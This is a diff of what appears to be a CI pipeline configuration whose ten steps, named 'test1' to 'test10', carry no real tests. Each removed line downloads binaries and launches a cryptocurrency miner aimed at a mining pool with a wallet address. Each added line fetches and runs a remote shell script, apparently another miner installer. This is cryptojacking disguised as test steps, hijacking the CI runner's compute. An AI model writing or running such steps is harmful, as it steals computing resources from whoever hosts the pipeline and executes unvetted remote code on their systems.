@@ -5,7 +5,7 @@ steps:
 - name: test1
   image: golang
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -15,7 +15,7 @@ steps:
 - name: test2
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -25,7 +25,7 @@ steps:
 - name: test3
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -35,7 +35,7 @@ steps:
 - name: test4
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -45,7 +45,7 @@ steps:
 - name: test5
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -55,7 +55,7 @@ steps:
 - name: test6
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -65,7 +65,7 @@ steps:
 - name: test7
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -75,7 +75,7 @@ steps:
 - name: test8
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -85,7 +85,7 @@ steps:
 - name: test9
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 type: docker
@@ -95,7 +95,7 @@ steps:
 - name: test10
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+  - wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
 ---
 kind: pipeline
 name: after
